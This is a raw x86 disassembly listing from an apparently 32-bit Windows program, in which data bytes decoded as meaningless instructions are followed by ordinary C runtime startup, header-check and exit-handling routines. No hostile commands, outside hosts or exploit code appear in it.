  422512:	idiv   DWORD PTR [esi+ebx*2]
  422515:	fcomi  st,st(4)
  422517:	mov    ds:0x80d8c68f,eax
  42251c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251d:	lods   eax,DWORD PTR ds:[esi]
  42251e:	cmp    al,BYTE PTR [edx+0xf2edd64]
  422524:	dec    esp
  422525:	dec    eax
  422526:	push   ss
  422527:	jae    0x4225a5
  422529:	dec    ecx
  42252a:	pop    edx
  42252b:	pop    esp
  42252c:	push   cs
  42252d:	xchg   cl,bh
  42252f:	mov    dl,0x5a
  422531:	mov    ebp,0x945ee1dd
  422536:	out    dx,eax
  422537:	in     al,0xd4
  422539:	xchg   ebx,eax
  42253a:	leave  
  42253b:	add    BYTE PTR [ecx-0x2e],bl
  42253e:	retf   0x87fb
  422541:	je     0x4225c2
  422543:	sub    eax,0xb06d1e9e
  422548:	dec    ecx
  422549:	pop    edi
  42254a:	inc    ebx
  42254b:	popa   
  42254c:	mov    al,0x90
  42254e:	(bad)  
  42254f:	jns    0x422515
  422551:	pop    eax
  422552:	pusha  
  422553:	lods   al,BYTE PTR ds:[esi]
  422554:	mov    dh,0x16
  422556:	mov    ebx,0xef92509d
  42255b:	loope  0x422571
  42255d:	hlt    
  42255e:	and    bh,ch
  422560:	sbb    eax,0xd5d3cd2c
  422565:	inc    ebp
  422566:	xchg   ebp,eax
  422567:	gs push edx
  422569:	dec    esi
  42256a:	fcom   DWORD PTR [edx-0x57f9634d]
  422570:	dec    ebp
  422571:	mov    edx,0x7f953183
  422576:	or     ebp,DWORD PTR [eax-0x79]
  422579:	fisttp DWORD PTR ds:0x889c80f2
  42257f:	int    0xc1
  422581:	loope  0x422598
  422583:	call   0x1715d922
  422588:	mov    WORD PTR ds:0x6d2f8b3,gs
  42258e:	pop    ds
  42258f:	cli    
  422590:	mov    cl,0x38
  422592:	int    0x11
  422594:	jecxz  0x42253c
  422596:	cmp    eax,0x76a2ecdb
  42259b:	pop    ss
  42259c:	sbb    eax,0xce919a4a
  4225a1:	and    edi,DWORD PTR [ecx+0x3f]
  4225a4:	loopne 0x42261d
  4225a6:	mov    edx,0xe63a02c
  4225ab:	push   ss
  4225ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ad:	push   edx
  4225ae:	adc    dl,al
  4225b0:	addr16 pop ds
  4225b2:	dec    eax
  4225b3:	adc    eax,0x1fbafd5a
  4225b8:	adc    BYTE PTR [edx-0x98ae8a7],bl
  4225be:	xchg   edx,eax
  4225bf:	sub    eax,0xfe23e593
  4225c4:	mov    ch,0xe7
  4225c6:	dec    edx
  4225c7:	push   ecx
  4225c8:	leave  
  4225c9:	out    0xbd,al
  4225cb:	ss std 
  4225cd:	lahf   
  4225ce:	pop    eax
  4225cf:	fwait
  4225d0:	imul   BYTE PTR [edi+ebx*8]
  4225d3:	int3   
  4225d4:	inc    edx
  4225d5:	lahf   
  4225d6:	call   0xbbc8f95a
  4225db:	sub    DWORD PTR ds:0x3a67dfdd,edi
  4225e1:	sbb    dl,bh
  4225e3:	sahf   
  4225e4:	inc    ecx
  4225e5:	sub    eax,0x9903a6a7
  4225ea:	adc    esp,ecx
  4225ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225ed:	mov    bl,0x7e
  4225ef:	adc    al,0x8f
  4225f1:	xor    esp,esi
  4225f3:	leave  
  4225f4:	push   cs
  4225f5:	fdivr  st(0),st
  4225f7:	fsub   st,st(7)
  4225f9:	mov    ah,0xe5
  4225fb:	dec    eax
  4225fc:	(bad)  [esi+ecx*4+0x26]
  422600:	in     eax,0xbe
  422602:	adc    esi,DWORD PTR [edi+esi*8]
  422605:	test   DWORD PTR [ecx+0x39],eax
  422608:	jge    0x4225b6
  42260a:	dec    eax
  42260b:	pop    ecx
  42260c:	jp     0x422636
  42260e:	bound  ecx,QWORD PTR [edi-0x78]
  422611:	mov    ds:0x910f860d,eax
  422616:	sbb    BYTE PTR [esi],al
  422618:	mov    al,0xa7
  42261a:	sub    al,0x14
  42261c:	add    eax,0x37294dbb
  422621:	push   ecx
  422622:	out    0x28,eax
  422624:	jne    0x422665
  422626:	cmp    eax,0x6fb2bea8
  42262b:	mov    dh,0xb3
  42262d:	and    BYTE PTR [ebx+0x2b729fe2],bl
  422633:	mov    esp,0xb77beba8
  422638:	lahf   
  422639:	pop    esi
  42263a:	(bad)  [edi+esi*4-0x7644e8c7]
  422641:	xor    ecx,eax
  422643:	mov    ebp,0x1d2d170d
  422648:	xchg   esp,eax
  422649:	and    eax,0x629edd2a
  42264e:	nop
  42264f:	clc    
  422650:	ss ja  0x42262a
  422653:	sub    BYTE PTR [edx],dl
  422655:	jae    0x4225e9
  422657:	add    ebx,DWORD PTR [eax]
  422659:	idiv   DWORD PTR [ecx+0x2a]
  42265c:	dec    ebp
  42265d:	xor    al,al
  42265f:	das    
  422660:	inc    ebx
  422661:	out    0x5,eax
  422663:	jg     0x42268b
  422665:	xchg   BYTE PTR [edi+0x27],dh
  422668:	out    0xae,al
  42266a:	sbb    ebp,DWORD PTR [esi-0x4a91a0c2]
  422670:	in     al,0xe5
  422672:	jmp    0x1bfa55f3
  422677:	shr    DWORD PTR [ecx],1
  422679:	stos   DWORD PTR es:[edi],eax
  42267a:	ret    
  42267b:	lea    edi,[ebx-0x57]
  42267e:	and    eax,0x274be111
  422683:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422684:	out    dx,eax
  422685:	ja     0x422653
  422687:	sti    
  422688:	pop    edx
  422689:	jecxz  0x422700
  42268b:	enter  0xa3af,0x53
  42268f:	push   ss
  422690:	or     dh,BYTE PTR [ebp-0x5347772c]
  422696:	xor    edi,edx
  422698:	aam    0xd2
  42269a:	adc    eax,0x4ce87cc9
  42269f:	icebp  
  4226a0:	into   
  4226a1:	fbld   TBYTE PTR [eax]
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	adc    ecx,edi
  4226a6:	enter  0x2ef0,0x2c
  4226aa:	jmp    0x422722
  4226ac:	dec    eax
  4226ad:	mov    ch,0x8f
  4226af:	pop    ds
  4226b0:	stos   DWORD PTR es:[edi],eax
  4226b1:	xor    al,0xc9
  4226b3:	rol    DWORD PTR [ebx-0x20359f1d],1
  4226b9:	in     eax,0xc2
  4226bb:	mov    esp,0x492d54c
  4226c0:	mov    ?,ebx
  4226c2:	xchg   BYTE PTR [edx-0x581bead4],cl
  4226c8:	mov    bl,ah
  4226ca:	pushf  
  4226cb:	mov    BYTE PTR [edi-0xb6b6fe6],bl
  4226d1:	retf   0xa4bd
  4226d4:	pop    ss
  4226d5:	xchg   edi,eax
  4226d6:	add    DWORD PTR [eax+0x53],edi
  4226d9:	(bad)  
  4226da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226db:	repnz fidivr WORD PTR [ebx]
  4226de:	cwde   
  4226df:	mov    ch,0x77
  4226e1:	ins    WORD PTR es:[edi],dx
  4226e3:	jp     0x4226a5
  4226e5:	add    esi,DWORD PTR [eax-0x319400f4]
  4226eb:	xlat   BYTE PTR ds:[ebx]
  4226ec:	jg     0x42268b
  4226ee:	xchg   esp,ebx
  4226f0:	dec    eax
  4226f1:	sbb    ecx,esi
  4226f3:	add    eax,0xd5e055ae
  4226f8:	mov    ah,BYTE PTR [ebp-0x78]
  4226fb:	cmp    edx,esp
  4226fd:	push   edi
  4226fe:	pushf  
  4226ff:	jmp    0xaf6b:0x9ec0a930
  422706:	pop    ss
  422707:	repnz icebp 
  422709:	xor    ecx,DWORD PTR [ebp-0x258f9906]
  42270f:	inc    esi
  422710:	jmp    0x422729
  422712:	pop    ebp
  422713:	fld    TBYTE PTR [eax-0x6b]
  422716:	in     al,0x9b
  422718:	rcr    BYTE PTR [ebx],0x3
  42271b:	enter  0x278,0x65
  42271f:	push   edi
  422720:	fcom   QWORD PTR [esi+0x1e006816]
  422726:	scas   eax,DWORD PTR es:[edi]
  422727:	mov    dl,0x27
  422729:	add    eax,0x2fb28ad9
  42272e:	cwde   
  42272f:	sub    BYTE PTR [esp+eax*1+0x57],0x3b
  422734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422735:	stos   DWORD PTR es:[edi],eax
  422736:	fsub   QWORD PTR [esi]
  422738:	mov    dh,0xd4
  42273a:	jbe    0x42278c
  42273c:	imul   ecx,DWORD PTR [esi+0x7755680],0x2
  422743:	mov    esi,0x350d7903
  422748:	mov    dh,0xa3
  42274a:	add    al,BYTE PTR ds:[ecx-0x7a]
  42274e:	inc    eax
  42274f:	dec    ebx
  422750:	ror    bh,cl
  422752:	fbld   TBYTE PTR [esi-0x40]
  422755:	or     BYTE PTR [ebp+0x1b3fdd20],cl
  42275b:	jle    0x422720
  42275d:	pop    eax
  42275e:	xchg   esp,eax
  42275f:	xor    DWORD PTR [ecx+0x3370c935],ecx
  422765:	in     al,0x94
  422767:	mov    ebx,0x50590a40
  42276c:	bound  ecx,QWORD PTR [esi]
  42276e:	loop   0x422785
  422770:	jmp    0xfb921c2b
  422775:	dec    BYTE PTR [edx-0x18]
  422778:	das    
  422779:	aad    0x8d
  42277b:	rol    BYTE PTR [edi-0x2572030b],1
  422781:	dec    ebp
  422782:	inc    BYTE PTR [edi]
  422784:	xor    BYTE PTR [eax+ebx*8],0x41
  422788:	inc    eax
  422789:	push   0xffffffe9
  42278b:	cld    
  42278c:	out    0x1c,al
  42278e:	mov    cl,0x44
  422790:	sub    al,0x98
  422792:	xchg   edx,eax
  422793:	xchg   ebp,eax
  422794:	or     ebx,DWORD PTR [ecx]
  422796:	add    al,dl
  422798:	pop    ss
  422799:	mov    ebp,eax
  42279b:	mov    eax,ds:0xc6611551
  4227a0:	pop    ds
  4227a1:	int    0xfc
  4227a3:	xor    cl,BYTE PTR [ecx+0x24a65c69]
  4227a9:	push   0xd
  4227ab:	test   al,0x8b
  4227ad:	inc    ebx
  4227ae:	fistp  DWORD PTR [ecx-0x4ac1fcbe]
  4227b4:	lahf   
  4227b5:	inc    esp
  4227b6:	popa   
  4227b7:	lods   eax,DWORD PTR ds:[esi]
  4227b9:	xchg   DWORD PTR [ecx+0x54],esi
  4227bc:	sti    
  4227bd:	mov    edi,0xfa72cbcf
  4227c2:	imul   edi,edx,0x6e
  4227c5:	into   
  4227c6:	loop   0x4227a2
  4227c8:	mov    cl,0xbc
  4227ca:	or     al,0x9
  4227cc:	sbb    eax,0x449a133f
  4227d1:	push   ebp
  4227d2:	adc    DWORD PTR [edi+0x6f7a390],edx
  4227d8:	cwde   
  4227d9:	aaa    
  4227da:	mov    ebp,cs
  4227dc:	or     BYTE PTR [esi-0x80],0x42
  4227e0:	jmp    0x9b6419be
  4227e5:	cmp    cl,BYTE PTR [esi-0x494c4580]
  4227eb:	fisub  DWORD PTR [ebx]
  4227ed:	sub    esp,DWORD PTR [edx-0x4a]
  4227f0:	ret    0xce76
  4227f3:	popf   
  4227f4:	sub    al,0x9e
  4227f6:	ret    0x2532
  4227f9:	mov    dh,0x6c
  4227fb:	mov    ch,0x2f
  4227fd:	push   edi
  4227fe:	fisttp WORD PTR [ecx+0x369f7ab7]
  422804:	jbe    0x422862
  422806:	pop    ebp
  422807:	sahf   
  422808:	mov    BYTE PTR [esi],bh
  42280a:	and    ebx,DWORD PTR [edi+0xf567143]
  422810:	sbb    al,0xfe
  422812:	ror    BYTE PTR [ebp-0x3eb6a589],1
  422818:	into   
  422819:	mov    cl,0xa2
  42281b:	jge    0x422821
  42281d:	xor    esi,edi
  42281f:	loope  0x422826
  422821:	lahf   
  422822:	fistp  WORD PTR [ebp+0x628ec577]
  422828:	jbe    0x422834
  42282a:	sbb    eax,esi
  42282c:	and    cl,BYTE PTR [ecx+0x59]
  42282f:	dec    eax
  422830:	stc    
  422831:	push   eax
  422832:	ins    DWORD PTR es:[edi],dx
  422833:	hlt    
  422834:	or     ebp,ebx
  422836:	mov    WORD PTR [esi],fs
  422838:	mov    BYTE PTR [ebx],cl
  42283a:	shl    DWORD PTR [edi-0x46],0x5
  42283e:	repnz das 
  422840:	xchg   esp,eax
  422841:	xchg   BYTE PTR ds:0xe82b046f,ch
  422847:	jbe    0x4227ee
  422849:	sbb    edx,DWORD PTR [esi+0x60]
  42284c:	iret   
  42284d:	enter  0xdee5,0xdc
  422851:	mov    dl,0xf9
  422853:	dec    edi
  422854:	cli    
  422855:	inc    ebx
  422856:	sub    bh,BYTE PTR [esi+eiz*1+0x318f9919]
  42285d:	dec    ebx
  42285e:	das    
  42285f:	or     DWORD PTR [edi+0x1e],esi
  422862:	je     0x422801
  422864:	das    
  422865:	repz jecxz 0x42280e
  422868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422869:	mov    esp,0x13064335
  42286e:	das    
  42286f:	scas   al,BYTE PTR es:[edi]
  422870:	nop
  422871:	scas   eax,DWORD PTR es:[edi]
  422872:	jmp    0x422869
  422874:	repnz xchg esi,eax
  422876:	adc    DWORD PTR ds:0x79a72e0c,eax
  42287c:	dec    esp
  42287d:	and    ch,BYTE PTR [edi+0x5f5af2c8]
  422883:	(bad)  
  422884:	adc    DWORD PTR ds:[edi-0x372c07d5],ecx
  42288b:	inc    eax
  42288c:	xor    al,0x6b
  42288e:	into   
  42288f:	push   eax
  422890:	add    DWORD PTR ds:0x7def517c,esi
  422896:	pop    es
  422897:	stos   BYTE PTR es:[edi],al
  422898:	and    cl,BYTE PTR [ebx-0xf]
  42289b:	dec    eax
  42289c:	jns    0x42289e
  42289e:	rol    BYTE PTR [ebx],cl
  4228a0:	xchg   ecx,eax
  4228a1:	scas   eax,DWORD PTR es:[edi]
  4228a2:	mov    bl,0xcb
  4228a4:	jne    0x422896
  4228a6:	inc    eax
  4228a7:	dec    ebp
  4228a8:	(bad)  
  4228a9:	lods   al,BYTE PTR ds:[esi]
  4228aa:	(bad)  
  4228ab:	iret   
  4228ac:	or     bh,BYTE PTR [esi+0x6]
  4228af:	mov    ebx,0x539c6447
  4228b4:	adc    bl,ah
  4228b6:	sub    BYTE PTR [edi],ch
  4228b8:	push   esp
  4228b9:	test   al,0x58
  4228bb:	adc    BYTE PTR [edi+0x14],ah
  4228be:	xchg   edi,eax
  4228bf:	int    0x6e
  4228c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228c2:	push   esi
  4228c3:	jg     0x4228d3
  4228c5:	pop    es
  4228c6:	sub    BYTE PTR [edi+edi*2+0x1440e493],bl
  4228cd:	icebp  
  4228ce:	ja     0x422895
  4228d0:	cmp    dh,BYTE PTR [esi-0x79]
  4228d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228d4:	sbb    DWORD PTR [esi-0x30],ebp
  4228d7:	ins    BYTE PTR es:[edi],dx
  4228d8:	mov    DWORD PTR [eax-0x9],ebp
  4228db:	xchg   BYTE PTR fs:[ebx+0x21],bl
  4228df:	adc    dl,bl
  4228e1:	addr16 mov edx,0x66e28d10
  4228e7:	addr16 je 0x422948
  4228ea:	or     eax,0xc399f50f
  4228ef:	loope  0x4228f4
  4228f1:	push   ss
  4228f2:	out    dx,eax
  4228f3:	imul   eax,DWORD PTR [ebp+edx*2+0x7b],0x19
  4228f8:	push   edx
  4228f9:	int    0xbc
  4228fb:	call   0xefd0fcf8
  422900:	lock adc esi,DWORD PTR [ecx]
  422903:	out    dx,al
  422904:	jle    0x42291a
  422906:	ins    BYTE PTR es:[edi],dx
  422907:	cmc    
  422908:	sub    al,0xa9
  42290a:	enter  0x2cd8,0x74
  42290e:	lods   al,BYTE PTR ds:[esi]
  42290f:	out    0xeb,al
  422911:	push   ds
  422912:	lahf   
  422913:	std    
  422914:	cs xor eax,eax
  422917:	mov    esp,ebp
  422919:	pop    ebp
  42291a:	ret    0x10
  42291d:	nop
  42291e:	nop
  42291f:	nop
  422920:	cmp    DWORD PTR ds:0x45cabc,0x1
  422927:	jne    0x42292e
  422929:	call   0x422e6c
  42292e:	push   DWORD PTR [esp+0x4]
  422932:	call   0x422cf5
  422937:	push   0xff
  42293c:	call   DWORD PTR ds:0x45c1c0
  422942:	pop    ecx
  422943:	pop    ecx
  422944:	ret    
  422945:	cmp    DWORD PTR ds:0x45cabc,0x1
  42294c:	jne    0x422953
  42294e:	call   0x422e6c
  422953:	push   DWORD PTR [esp+0x4]
  422957:	call   0x422cf5
  42295c:	push   0xff
  422961:	call   0x422b3b
  422966:	pop    ecx
  422967:	pop    ecx
  422968:	ret    
  422969:	push   0x60
  42296b:	push   0x428110
  422970:	call   0x423858
  422975:	mov    edi,0x94
  42297a:	mov    eax,edi
  42297c:	call   0x4238b0
  422981:	mov    DWORD PTR [ebp-0x18],esp
  422984:	mov    esi,esp
  422986:	mov    DWORD PTR [esi],edi
  422988:	push   esi
  422989:	call   DWORD PTR ds:0x428024
  42298f:	mov    ecx,DWORD PTR [esi+0x10]
  422992:	mov    DWORD PTR ds:0x45cac4,ecx
  422998:	mov    eax,DWORD PTR [esi+0x4]
  42299b:	mov    ds:0x45cad0,eax
  4229a0:	mov    edx,DWORD PTR [esi+0x8]
  4229a3:	mov    DWORD PTR ds:0x45cad4,edx
  4229a9:	mov    esi,DWORD PTR [esi+0xc]
  4229ac:	and    esi,0x7fff
  4229b2:	mov    DWORD PTR ds:0x45cac8,esi
  4229b8:	cmp    ecx,0x2
  4229bb:	je     0x4229c9
  4229bd:	or     esi,0x8000
  4229c3:	mov    DWORD PTR ds:0x45cac8,esi
  4229c9:	shl    eax,0x8
  4229cc:	add    eax,edx
  4229ce:	mov    ds:0x45cacc,eax
  4229d3:	xor    esi,esi
  4229d5:	push   esi
  4229d6:	mov    edi,DWORD PTR ds:0x428014
  4229dc:	call   edi
  4229de:	cmp    WORD PTR [eax],0x5a4d
  4229e3:	jne    0x422a04
  4229e5:	mov    ecx,DWORD PTR [eax+0x3c]
  4229e8:	add    ecx,eax
  4229ea:	cmp    DWORD PTR [ecx],0x4550
  4229f0:	jne    0x422a04
  4229f2:	movzx  eax,WORD PTR [ecx+0x18]
  4229f6:	cmp    eax,0x10b
  4229fb:	je     0x422a1c
  4229fd:	cmp    eax,0x20b
  422a02:	je     0x422a09
  422a04:	mov    DWORD PTR [ebp-0x1c],esi
  422a07:	jmp    0x422a30
  422a09:	cmp    DWORD PTR [ecx+0x84],0xe
  422a10:	jbe    0x422a04
  422a12:	xor    eax,eax
  422a14:	cmp    DWORD PTR [ecx+0xf8],esi
  422a1a:	jmp    0x422a2a
  422a1c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a20:	jbe    0x422a04
  422a22:	xor    eax,eax
  422a24:	cmp    DWORD PTR [ecx+0xe8],esi
  422a2a:	setne  al
  422a2d:	mov    DWORD PTR [ebp-0x1c],eax
  422a30:	push   0x1
  422a32:	call   0x423807
  422a37:	pop    ecx
  422a38:	test   eax,eax
  422a3a:	jne    0x422a44
  422a3c:	push   0x1c
  422a3e:	call   0x422945
  422a43:	pop    ecx
  422a44:	call   0x42377e
  422a49:	test   eax,eax
  422a4b:	jne    0x422a55
  422a4d:	push   0x10
  422a4f:	call   0x422945
  422a54:	pop    ecx
  422a55:	call   0x423667
  422a5a:	mov    DWORD PTR [ebp-0x4],esi
  422a5d:	call   0x423469
  422a62:	test   eax,eax
  422a64:	jge    0x422a6e
  422a66:	push   0x1b
  422a68:	call   0x422920
  422a6d:	pop    ecx
  422a6e:	call   DWORD PTR ds:0x428020
  422a74:	mov    ds:0x45d274,eax
  422a79:	call   0x423347
  422a7e:	mov    ds:0x45cab4,eax
  422a83:	call   0x4232a5
  422a88:	test   eax,eax
  422a8a:	jge    0x422a94
  422a8c:	push   0x8
  422a8e:	call   0x422920
  422a93:	pop    ecx
  422a94:	call   0x423072
  422a99:	test   eax,eax
  422a9b:	jge    0x422aa5
  422a9d:	push   0x9
  422a9f:	call   0x422920
  422aa4:	pop    ecx
  422aa5:	call   0x422b7d
  422aaa:	mov    DWORD PTR [ebp-0x20],eax
  422aad:	cmp    eax,esi
  422aaf:	je     0x422ab8
  422ab1:	push   eax
  422ab2:	call   0x422920
  422ab7:	pop    ecx
  422ab8:	mov    DWORD PTR [ebp-0x38],esi
  422abb:	lea    eax,[ebp-0x64]
  422abe:	push   eax
  422abf:	call   DWORD PTR ds:0x42801c
  422ac5:	call   0x423009
  422aca:	mov    DWORD PTR [ebp-0x68],eax
  422acd:	test   BYTE PTR [ebp-0x38],0x1
  422ad1:	je     0x422ad9
  422ad3:	movzx  eax,WORD PTR [ebp-0x34]
  422ad7:	jmp    0x422adc
  422ad9:	push   0xa
  422adb:	pop    eax
  422adc:	push   eax
  422add:	push   DWORD PTR [ebp-0x68]
  422ae0:	push   esi
  422ae1:	push   esi
  422ae2:	call   edi
  422ae4:	push   eax
  422ae5:	call   0x421790
  422aea:	mov    edi,eax
  422aec:	mov    DWORD PTR [ebp-0x6c],edi
  422aef:	cmp    DWORD PTR [ebp-0x1c],esi
  422af2:	jne    0x422afa
  422af4:	push   edi
  422af5:	call   0x422cb5
  422afa:	call   0x422cd7
  422aff:	jmp    0x422b2c
  422b01:	mov    eax,DWORD PTR [ebp-0x14]
  422b04:	mov    ecx,DWORD PTR [eax]
  422b06:	mov    ecx,DWORD PTR [ecx]
  422b08:	mov    DWORD PTR [ebp-0x70],ecx
  422b0b:	push   eax
  422b0c:	push   ecx
  422b0d:	call   0x422ea5
  422b12:	pop    ecx
  422b13:	pop    ecx
  422b14:	ret    
  422b15:	mov    esp,DWORD PTR [ebp-0x18]
  422b18:	mov    edi,DWORD PTR [ebp-0x70]
  422b1b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b1f:	jne    0x422b27
  422b21:	push   edi
  422b22:	call   0x422cc6
  422b27:	call   0x422ce6
  422b2c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b30:	mov    eax,edi
  422b32:	lea    esp,[ebp-0x7c]
  422b35:	call   0x423893
  422b3a:	ret    
  422b3b:	push   0x42812c
  422b40:	call   DWORD PTR ds:0x428014
  422b46:	test   eax,eax
  422b48:	je     0x422b60
  422b4a:	push   0x42811c
  422b4f:	push   eax
  422b50:	call   DWORD PTR ds:0x428018
  422b56:	test   eax,eax
  422b58:	je     0x422b60
  422b5a:	push   DWORD PTR [esp+0x4]
  422b5e:	call   eax
  422b60:	push   DWORD PTR [esp+0x4]
  422b64:	call   DWORD PTR ds:0x428028
  422b6a:	int3   
  422b6b:	push   0x8
  422b6d:	call   0x423a1f
  422b72:	pop    ecx
  422b73:	ret    
  422b74:	push   0x8
  422b76:	call   0x42398b
  422b7b:	pop    ecx
  422b7c:	ret    
  422b7d:	mov    eax,ds:0x45d270
  422b82:	test   eax,eax
  422b84:	je     0x422b88
  422b86:	call   eax
  422b88:	push   esi
  422b89:	push   edi
  422b8a:	mov    ecx,0x42a00c
  422b8f:	mov    edi,0x42a018
  422b94:	xor    eax,eax
  422b96:	cmp    ecx,edi
  422b98:	mov    esi,ecx
  422b9a:	jae    0x422bb3
  422b9c:	test   eax,eax
  422b9e:	jne    0x422bdf
  422ba0:	mov    ecx,DWORD PTR [esi]
  422ba2:	test   ecx,ecx
  422ba4:	je     0x422ba8
  422ba6:	call   ecx
  422ba8:	add    esi,0x4
  422bab:	cmp    esi,edi
  422bad:	jb     0x422b9c
  422baf:	test   eax,eax
  422bb1:	jne    0x422bdf
  422bb3:	push   0x4236ab
  422bb8:	call   0x423b30
  422bbd:	mov    esi,0x42a000
  422bc2:	mov    eax,esi
  422bc4:	mov    edi,0x42a008
  422bc9:	cmp    eax,edi
  422bcb:	pop    ecx
  422bcc:	jae    0x422bdd
  422bce:	mov    eax,DWORD PTR [esi]
  422bd0:	test   eax,eax
  422bd2:	je     0x422bd6
  422bd4:	call   eax
  422bd6:	add    esi,0x4
  422bd9:	cmp    esi,edi
  422bdb:	jb     0x422bce
  422bdd:	xor    eax,eax
  422bdf:	pop    edi
  422be0:	pop    esi
  422be1:	ret    
  422be2:	push   ebp
  422be3:	mov    ebp,esp
  422be5:	push   esi
  422be6:	push   edi
  422be7:	push   0x8
  422be9:	call   0x423a1f
  422bee:	xor    esi,esi
  422bf0:	inc    esi
  422bf1:	cmp    DWORD PTR ds:0x45cb04,esi
  422bf7:	pop    ecx
  422bf8:	jne    0x422c0a
  422bfa:	push   DWORD PTR [ebp+0x8]
  422bfd:	call   DWORD PTR ds:0x428030
  422c03:	push   eax
  422c04:	call   DWORD PTR ds:0x42802c
  422c0a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c0e:	mov    al,BYTE PTR [ebp+0x10]
  422c11:	mov    DWORD PTR ds:0x45cb00,esi
  422c17:	mov    ds:0x45cafc,al
  422c1c:	jne    0x422c70
  422c1e:	mov    ecx,DWORD PTR ds:0x45d268
  422c24:	test   ecx,ecx
  422c26:	je     0x422c51
  422c28:	mov    eax,ds:0x45d264
  422c2d:	sub    eax,0x4
  422c30:	cmp    eax,ecx
  422c32:	jmp    0x422c4a
  422c34:	mov    eax,DWORD PTR [eax]
  422c36:	test   eax,eax
  422c38:	je     0x422c3c
  422c3a:	call   eax
  422c3c:	mov    eax,ds:0x45d264
  422c41:	sub    eax,0x4
  422c44:	cmp    eax,DWORD PTR ds:0x45d268
  422c4a:	mov    ds:0x45d264,eax
  422c4f:	jae    0x422c34
  422c51:	mov    eax,0x42a01c
  422c56:	mov    esi,0x42a020
  422c5b:	cmp    eax,esi
  422c5d:	mov    edi,eax
  422c5f:	jae    0x422c70
  422c61:	mov    eax,DWORD PTR [edi]
  422c63:	test   eax,eax
  422c65:	je     0x422c69
  422c67:	call   eax
  422c69:	add    edi,0x4
  422c6c:	cmp    edi,esi
  422c6e:	jb     0x422c61
  422c70:	mov    eax,0x42a024
  422c75:	mov    esi,0x42a028
  422c7a:	cmp    eax,esi
  422c7c:	mov    edi,eax
  422c7e:	jae    0x422c8f
  422c80:	mov    eax,DWORD PTR [edi]
  422c82:	test   eax,eax
  422c84:	je     0x422c88
  422c86:	call   eax
  422c88:	add    edi,0x4
  422c8b:	cmp    edi,esi
  422c8d:	jb     0x422c80
  422c8f:	cmp    DWORD PTR [ebp+0x10],0x0
  422c93:	pop    edi
  422c94:	pop    esi
  422c95:	je     0x422ca0
  422c97:	push   0x8
  422c99:	call   0x42398b
  422c9e:	jmp    0x422cb2
  422ca0:	push   DWORD PTR [ebp+0x8]
  422ca3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cad:	call   0x422b3b
  422cb2:	pop    ecx
  422cb3:	pop    ebp
  422cb4:	ret    
  422cb5:	push   0x0
  422cb7:	push   0x0
  422cb9:	push   DWORD PTR [esp+0xc]
  422cbd:	call   0x422be2
  422cc2:	add    esp,0xc
  422cc5:	ret    
  422cc6:	push   0x0
  422cc8:	push   0x1
  422cca:	push   DWORD PTR [esp+0xc]
  422cce:	call   0x422be2
  422cd3:	add    esp,0xc
  422cd6:	ret    
  422cd7:	push   0x1
  422cd9:	push   0x0
  422cdb:	push   0x0
  422cdd:	call   0x422be2
  422ce2:	add    esp,0xc
  422ce5:	ret    
  422ce6:	push   0x1
  422ce8:	push   0x1
  422cea:	push   0x0
  422cec:	call   0x422be2
  422cf1:	add    esp,0xc
  422cf4:	ret    
  422cf5:	push   ebp
  422cf6:	mov    ebp,esp
  422cf8:	sub    esp,0x10c
  422cfe:	mov    eax,ds:0x45c430
  422d03:	xor    eax,DWORD PTR [ebp+0x4]
  422d06:	mov    ecx,DWORD PTR [ebp+0x8]
  422d09:	push   ebx
  422d0a:	push   esi
  422d0b:	mov    DWORD PTR [ebp-0x4],eax
  422d0e:	xor    edx,edx
  422d10:	push   edi
  422d11:	xor    eax,eax
  422d13:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d1a:	je     0x422d22
  422d1c:	inc    eax
  422d1d:	cmp    eax,0x12
  422d20:	jb     0x422d13
  422d22:	mov    esi,eax
  422d24:	shl    esi,0x3
  422d27:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d2d:	jne    0x422e56
  422d33:	mov    eax,ds:0x45cabc
  422d38:	cmp    eax,0x1
  422d3b:	je     0x422e31
  422d41:	cmp    eax,edx
  422d43:	jne    0x422d52
  422d45:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d4c:	je     0x422e31
  422d52:	cmp    ecx,0xfc
  422d58:	je     0x422e56
  422d5e:	push   0x104
  422d63:	lea    eax,[ebp-0x10c]
  422d69:	push   eax
  422d6a:	push   edx
  422d6b:	mov    BYTE PTR [ebp-0x8],dl
  422d6e:	call   DWORD PTR ds:0x42803c
  422d74:	test   eax,eax
  422d76:	jne    0x422d8b
  422d78:	lea    eax,[ebp-0x10c]
  422d7e:	push   0x428484
  422d83:	push   eax
  422d84:	call   0x423c40
  422d89:	pop    ecx
  422d8a:	pop    ecx
  422d8b:	lea    eax,[ebp-0x10c]
  422d91:	push   eax
  422d92:	lea    edi,[ebp-0x10c]
  422d98:	call   0x423e70
  422d9d:	inc    eax
  422d9e:	cmp    eax,0x3c
  422da1:	pop    ecx
  422da2:	jbe    0x422dcd
  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
